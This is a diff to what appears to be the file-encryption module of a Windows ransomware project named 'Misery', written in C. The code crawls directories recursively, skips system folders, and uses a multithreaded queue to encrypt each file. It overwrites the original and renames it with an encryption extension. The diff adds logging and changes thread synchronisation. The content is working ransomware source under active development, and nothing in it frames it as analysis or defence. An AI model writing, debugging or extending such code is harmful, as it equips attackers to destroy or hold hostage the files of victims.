@@ -1,5 +1,6 @@
 #include "fileops.h"
 #include "crypto.h"
+#include "misery_config.h"
 #include <stdio.h>
 #include <string.h>
 #include <shlobj.h>
@@ -13,6 +14,8 @@ static const char *g_skip[] = {
     "\\Program Files", "\\Program Files (x86)",
     "\\AppData", "\\$Recycle.Bin", "\\Boot",
     "\\ProgramData\\Microsoft",
+    "\\.venv",
+    "\\node_modules",
     NULL
 };
 
@@ -62,9 +65,9 @@ struct FILEOPS_CTX {
         WCHAR   path[];              /* flexible array */
     }                *queueHead;
     struct WorkItem **queueTail;
-    volatile LONG     queueCount;
+    LONG              queueCount;
 
-    volatile LONG     activeWorkers;
+    LONG              activeWorkers;
 
     CRITICAL_SECTION  queueLock;
     CONDITION_VARIABLE queueNotEmpty;
@@ -100,8 +103,8 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         if (ctx->queueHead == NULL) {
             ctx->queueTail = &ctx->queueHead;
         }
-        InterlockedDecrement(&ctx->queueCount);
-        InterlockedIncrement(&ctx->activeWorkers);
+        ctx->queueCount--;
+        ctx->activeWorkers++;
         LeaveCriticalSection(&ctx->queueLock);
 
         /* ── Process the file ── */
@@ -114,17 +117,20 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         item = NULL;
 
         if (narrowLen <= 0 || narrowLen >= (int)sizeof(narrowPath)) {
+            MiseryLog(MISERY_LOG_WARN, "FileOps: Path conversion failed (err: %lu)",
+                      GetLastError());
             EnterCriticalSection(&ctx->statsLock);
             ctx->stats.filesFailed++;
             LeaveCriticalSection(&ctx->statsLock);
 
-            InterlockedDecrement(&ctx->activeWorkers);
-            /* Wake up anyone waiting for idle */
+            EnterCriticalSection(&ctx->queueLock);
+            ctx->activeWorkers--;
             WakeConditionVariable(&ctx->queueIdle);
+            LeaveCriticalSection(&ctx->queueLock);
             continue;
         }
 
-        /* ── EncryptSingleFileInternal logic ── */
+        /* ── Encrypt file logic ── */
         HANDLE hFile = INVALID_HANDLE_VALUE;
         BYTE  *buf   = NULL;
         BYTE  *plaintext = NULL;
@@ -132,15 +138,34 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         DWORD  fs = 0;
         bool   success = false;
 
-        hFile = CreateFileA(narrowPath, GENERIC_READ, FILE_SHARE_READ,
+        hFile = CreateFileA(narrowPath, GENERIC_READ,
+                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                             NULL, OPEN_EXISTING,
                             FILE_ATTRIBUTE_NORMAL, NULL);
         if (hFile == INVALID_HANDLE_VALUE) {
+            MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot open %s (err: %lu)",
+                      narrowPath, GetLastError());
             goto worker_done_file;
         }
 
         fs = GetFileSize(hFile, NULL);
-        if (fs == INVALID_FILE_SIZE || fs < 1) {
+        if (fs == INVALID_FILE_SIZE) {
+            MiseryLog(MISERY_LOG_WARN, "FileOps: GetFileSize failed for %s (err: %lu)",
+                      narrowPath, GetLastError());
+            CloseHandle(hFile);
+            hFile = INVALID_HANDLE_VALUE;
+            goto worker_done_file;
+        }
+
+        if (fs == 0) {
+            /* Empty file — nothing to encrypt, count as success */
+            CloseHandle(hFile);
+            hFile = INVALID_HANDLE_VALUE;
+            MiseryLog(MISERY_LOG_INFO, "FileOps: Skipped empty file: %s", narrowPath);
+            success = true;
+            EnterCriticalSection(&ctx->statsLock);
+            ctx->stats.filesSucceeded++;
+            LeaveCriticalSection(&ctx->statsLock);
             goto worker_done_file;
         }
 
@@ -148,15 +173,25 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         buf = (BYTE *)VirtualAlloc(NULL, bufSize,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_READWRITE);
-        if (!buf) goto worker_done_file;
+        if (!buf) {
+            MiseryLog(MISERY_LOG_WARN, "FileOps: VirtualAlloc(%lu) failed for %s (err: %lu)",
+                      bufSize, narrowPath, GetLastError());
+            goto worker_done_file;
+        }
 
         plaintext = (BYTE *)VirtualAlloc(NULL, fs,
                                          MEM_COMMIT | MEM_RESERVE,
                                          PAGE_READWRITE);
-        if (!plaintext) goto worker_done_file;
+        if (!plaintext) {
+            MiseryLog(MISERY_LOG_WARN, "FileOps: VirtualAlloc(%lu) for plaintext failed for %s (err: %lu)",
+                      fs, narrowPath, GetLastError());
+            goto worker_done_file;
+        }
 
         DWORD rd = 0;
         if (!ReadFile(hFile, plaintext, fs, &rd, NULL) || rd != fs) {
+            MiseryLog(MISERY_LOG_WARN, "FileOps: ReadFile failed for %s (err: %lu)",
+                      narrowPath, GetLastError());
             goto worker_done_file;
         }
 
@@ -164,7 +199,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         hFile = INVALID_HANDLE_VALUE;
 
         DWORD encLen = 0;
-        CRYPTO_ERROR cerr = EncryptBuffer(GetCryptoCtx(),
+        CRYPTO_ERROR cerr = EncryptBuffer(ctx->config.crypto_ctx,
                                           plaintext,
                                           rd,
                                           buf,
@@ -176,6 +211,8 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         plaintext = NULL;
 
         if (cerr != CRYPTO_SUCCESS) {
+            MiseryLog(MISERY_LOG_WARN, "FileOps: EncryptBuffer failed for %s: %s (code=%d)",
+                      narrowPath, GetErrorString(cerr), cerr);
             goto worker_done_file;
         }
 
@@ -183,25 +220,37 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         char tmpPath[FILEOPS_MAX_PATH];
         int tmpLen = snprintf(tmpPath, sizeof(tmpPath), "%s.tmp", narrowPath);
         if (tmpLen < 0 || tmpLen >= (int)sizeof(tmpPath)) {
+            MiseryLog(MISERY_LOG_WARN, "FileOps: Temp path too long for %s", narrowPath);
             goto worker_done_file;
         }
 
-        HANDLE hWrite = CreateFileA(tmpPath, GENERIC_WRITE, 0,
+        HANDLE hWrite = CreateFileA(tmpPath, GENERIC_WRITE,
+                                    FILE_SHARE_READ,
                                     NULL, CREATE_ALWAYS,
                                     FILE_ATTRIBUTE_NORMAL, NULL);
-        if (hWrite == INVALID_HANDLE_VALUE) goto worker_done_file;
+        if (hWrite == INVALID_HANDLE_VALUE) {
+            MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot create tmp %s (err: %lu)",
+                      tmpPath, GetLastError());
+            goto worker_done_file;
+        }
 
         DWORD wr = 0;
         BOOL writeOk = WriteFile(hWrite, buf, encLen, &wr, NULL);
         CloseHandle(hWrite);
 
         if (!writeOk || wr != encLen) {
+            MiseryLog(MISERY_LOG_WARN,
+                      "FileOps: WriteFile failed for %s (wrote %lu/%lu, err: %lu)",
+                      tmpPath, wr, encLen, GetLastError());
             DeleteFileA(tmpPath);
             goto worker_done_file;
         }
 
         /* ── Atomic rename: .tmp → original ── */
-        if (!MoveFileExA(tmpPath, narrowPath, MOVEFILE_REPLACE_EXISTING)) {
+        if (!MoveFileExA(tmpPath, narrowPath,
+                         MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
+            MiseryLog(MISERY_LOG_WARN, "FileOps: MoveFileEx %s → %s failed (err: %lu)",
+                      tmpPath, narrowPath, GetLastError());
             DeleteFileA(tmpPath);
             goto worker_done_file;
         }
@@ -211,15 +260,21 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         int encLen2 = snprintf(encPath, sizeof(encPath), "%s%s",
                                narrowPath, ENC_EXT);
         if (encLen2 < 0 || encLen2 >= (int)sizeof(encPath)) {
+            MiseryLog(MISERY_LOG_WARN, "FileOps: Encrypted path too long for %s", narrowPath);
             goto worker_done_file;
         }
 
-        if (!MoveFileExA(narrowPath, encPath, MOVEFILE_REPLACE_EXISTING)) {
+        if (!MoveFileExA(narrowPath, encPath,
+                         MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
+            MiseryLog(MISERY_LOG_WARN, "FileOps: MoveFileEx %s → %s failed (err: %lu)",
+                      narrowPath, encPath, GetLastError());
             goto worker_done_file;
         }
 
         /* ── Full success ── */
         success = true;
+        MiseryLog(MISERY_LOG_INFO, "FileOps: Encrypted %s (%lu bytes) → %s",
+                  narrowPath, fs, encPath);
         EnterCriticalSection(&ctx->statsLock);
         ctx->stats.bytesProcessed += fs;
         ctx->stats.filesSucceeded++;
@@ -240,9 +295,11 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         }
         if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
 
-        /* ── Decrement active workers and signal idle ── */
-        InterlockedDecrement(&ctx->activeWorkers);
+        /* ── Decrement active workers and signal idle (INSIDE LOCK) ── */
+        EnterCriticalSection(&ctx->queueLock);
+        ctx->activeWorkers--;
         WakeConditionVariable(&ctx->queueIdle);
+        LeaveCriticalSection(&ctx->queueLock);
     }
 
     return 0;
@@ -257,7 +314,11 @@ static void EnqueueFile(FILEOPS_CTX *ctx, const WCHAR *fullPath) {
     struct WorkItem *item = (struct WorkItem *)
         HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                   sizeof(struct WorkItem) + pathBytes);
-    if (!item) return;
+    if (!item) {
+        MiseryLog(MISERY_LOG_WARN, "FileOps: HeapAlloc failed for enqueue (size=%zu)",
+                  sizeof(struct WorkItem) + pathBytes);
+        return;
+    }
 
     memcpy(item->path, fullPath, pathBytes);
     item->next = NULL;
@@ -265,10 +326,9 @@ static void EnqueueFile(FILEOPS_CTX *ctx, const WCHAR *fullPath) {
     EnterCriticalSection(&ctx->queueLock);
     *ctx->queueTail = item;
     ctx->queueTail = &item->next;
-    InterlockedIncrement(&ctx->queueCount);
-    LeaveCriticalSection(&ctx->queueLock);
-
+    ctx->queueCount++;
     WakeConditionVariable(&ctx->queueNotEmpty);
+    LeaveCriticalSection(&ctx->queueLock);
 }
 
 /* ── Internal recursive crawler (WCHAR) ── */
@@ -285,7 +345,13 @@ static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
     HANDLE hFind = FindFirstFileExW(pattern, FindExInfoStandard,
                                      &fd, FindExSearchNameMatch,
                                      NULL, 0);
-    if (hFind == INVALID_HANDLE_VALUE) return;
+    if (hFind == INVALID_HANDLE_VALUE) {
+        char narrowDir[FILEOPS_MAX_PATH];
+        WideCharToMultiByte(CP_UTF8, 0, dir, -1, narrowDir, sizeof(narrowDir), NULL, NULL);
+        MiseryLog(MISERY_LOG_WARN, "FileOps: Cannot open directory: %s (err: %lu)",
+                  narrowDir, GetLastError());
+        return;
+    }
 
     do {
         if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L".."))
@@ -317,6 +383,7 @@ static void TraverseInternal(FILEOPS_CTX *ctx, const WCHAR *dir, int depth) {
             if (GetFileAttributesA(encPath) != INVALID_FILE_ATTRIBUTES)
                 continue;
 
+            MiseryLog(MISERY_LOG_INFO, "FileOps: Queueing file: %s", narrow);
             EnqueueFile(ctx, full);
         }
     } while (FindNextFileW(hFind, &fd));
@@ -341,6 +408,13 @@ FILEOPS_CTX* FileOps_CreateContext(const FILEOPS_CONFIG* config) {
         ctx->config.flags = FILEOPS_FLAG_RECURSIVE;
         ctx->config.extension[0] = L'\0';
         ctx->config.pfnShouldSkip = NULL;
+        ctx->config.crypto_ctx = NULL;
+    }
+
+    if (!ctx->config.crypto_ctx) {
+        MiseryLog(MISERY_LOG_ERROR, "FileOps: crypto_ctx is NULL!");
+        HeapFree(GetProcessHeap(), 0, ctx);
+        return NULL;
     }
 
     if (ctx->config.threadCount < 1)
@@ -368,7 +442,6 @@ FILEOPS_CTX* FileOps_CreateContext(const FILEOPS_CONFIG* config) {
         return NULL;
     }
 
-    /* FIX: Track how many threads successfully created */
     DWORD threadsCreated = 0;
     for (DWORD i = 0; i < ctx->threadCount; i++) {
         HANDLE h = CreateThread(NULL, 0, WorkerThread, ctx, 0, NULL);
@@ -380,8 +453,8 @@ FILEOPS_CTX* FileOps_CreateContext(const FILEOPS_CONFIG* config) {
         }
     }
 
-    /* FIX: If no threads were created, fail the context creation */
     if (threadsCreated == 0) {
+        MiseryLog(MISERY_LOG_ERROR, "FileOps: Failed to create worker threads");
         DeleteCriticalSection(&ctx->statsLock);
         DeleteCriticalSection(&ctx->queueLock);
         HeapFree(GetProcessHeap(), 0, ctx->threads);
@@ -389,27 +462,18 @@ FILEOPS_CTX* FileOps_CreateContext(const FILEOPS_CONFIG* config) {
         return NULL;
     }
 
+    MiseryLog(MISERY_LOG_INFO, "FileOps: Created context with %lu threads", threadsCreated);
     return ctx;
 }
 
 void FileOps_TraverseAndQueue(FILEOPS_CTX* ctx, const WCHAR* rootPath) {
     if (!ctx || !rootPath) return;
+    char narrowPath[FILEOPS_MAX_PATH];
+    WideCharToMultiByte(CP_UTF8, 0, rootPath, -1, narrowPath, sizeof(narrowPath), NULL, NULL);
+    MiseryLog(MISERY_LOG_INFO, "FileOps: Starting traverse of: %s", narrowPath);
     TraverseInternal(ctx, rootPath, 0);
 }
 
-bool FileOps_ProcessSingleFile(FILEOPS_CTX* ctx, const WCHAR* filePath) {
-    if (!ctx || !filePath) return false;
-
-    char narrow[FILEOPS_MAX_PATH];
-    if (WideCharToMultiByte(CP_UTF8, 0, filePath, -1,
-                            narrow, sizeof(narrow), NULL, NULL) <= 0)
-        return false;
-
-    if (!IsTargetExtension(narrow)) return false;
-
-    EnqueueFile(ctx, filePath);
-    return true;
-}
 
 void FileOps_WaitForCompletion(FILEOPS_CTX* ctx) {
     if (!ctx) return;
@@ -433,11 +497,11 @@ void FileOps_GetStats(FILEOPS_CTX* ctx, FILEOPS_STATS* outStats) {
 void FileOps_DestroyContext(FILEOPS_CTX* ctx) {
     if (!ctx) return;
 
-    /* Signal shutdown */
+    EnterCriticalSection(&ctx->queueLock);
     InterlockedExchange(&ctx->shutdownFlag, 1);
     WakeAllConditionVariable(&ctx->queueNotEmpty);
+    LeaveCriticalSection(&ctx->queueLock);
 
-    /* Wait for threads to exit */
     for (DWORD i = 0; i < ctx->threadCount; i++) {
         if (ctx->threads[i]) {
             WaitForSingleObject(ctx->threads[i], INFINITE);
@@ -445,7 +509,6 @@ void FileOps_DestroyContext(FILEOPS_CTX* ctx) {
         }
     }
 
-    /* Drain any remaining work items */
     struct WorkItem *item = ctx->queueHead;
     while (item) {
         struct WorkItem *next = item->next;
@@ -460,7 +523,7 @@ void FileOps_DestroyContext(FILEOPS_CTX* ctx) {
 }
 
 /* ── Should skip system directories ── */
-static bool ShouldSkip(const WCHAR* path) {
+bool FileOps_DefaultShouldSkip(const WCHAR* path) {
     char narrow[FILEOPS_MAX_PATH];
     if (!WideCharToMultiByte(CP_UTF8, 0, path, -1,
                               narrow, sizeof(narrow), NULL, NULL))
@@ -484,61 +547,4 @@ static bool IsTargetExtension(const char* path) {
             return true;
     }
     return false;
-}
-
-/* ── Global context ── */
-static FILEOPS_CTX *g_ctx = NULL;
-
-bool InitFileOps(int threadCount) {
-    if (g_ctx) return true;
-
-    FILEOPS_CONFIG cfg = {0};
-    cfg.threadCount = (threadCount > 0) ? (DWORD)threadCount : FILEOPS_DEFAULT_THREADS;
-    cfg.flags = FILEOPS_FLAG_RECURSIVE;
-    cfg.pfnShouldSkip = ShouldSkip;
-
-    g_ctx = FileOps_CreateContext(&cfg);
-    return (g_ctx != NULL);
-}
-
-void CleanupFileOps(void) {
-    if (g_ctx) {
-        FileOps_WaitForCompletion(g_ctx);
-        FileOps_DestroyContext(g_ctx);
-        g_ctx = NULL;
-    }
-}
-
-bool EncryptSingleFile(const char *narrowPath) {
-    if (!g_ctx || !narrowPath) return false;
-
-    WCHAR wide[FILEOPS_MAX_PATH];
-    int wlen = MultiByteToWideChar(CP_UTF8, 0, narrowPath, -1,
-                                    wide, FILEOPS_MAX_PATH);
-    if (wlen <= 0) return false;
-
-    if (!FileOps_ProcessSingleFile(g_ctx, wide))
-        return false;
-
-    FileOps_WaitForCompletion(g_ctx);
-
-    FILEOPS_STATS stats;
-    FileOps_GetStats(g_ctx, &stats);
-    return (stats.filesSucceeded > 0 && stats.filesFailed == 0);
-}
-
-int EncryptDirectory(const char *narrowPath) {
-    if (!g_ctx || !narrowPath) return 0;
-
-    WCHAR wide[FILEOPS_MAX_PATH];
-    int wlen = MultiByteToWideChar(CP_UTF8, 0, narrowPath, -1,
-                                    wide, FILEOPS_MAX_PATH);
-    if (wlen <= 0) return 0;
-
-    FileOps_TraverseAndQueue(g_ctx, wide);
-    FileOps_WaitForCompletion(g_ctx);
-
-    FILEOPS_STATS stats;
-    FileOps_GetStats(g_ctx, &stats);
-    return (int)(stats.filesSucceeded + stats.filesFailed);
 }
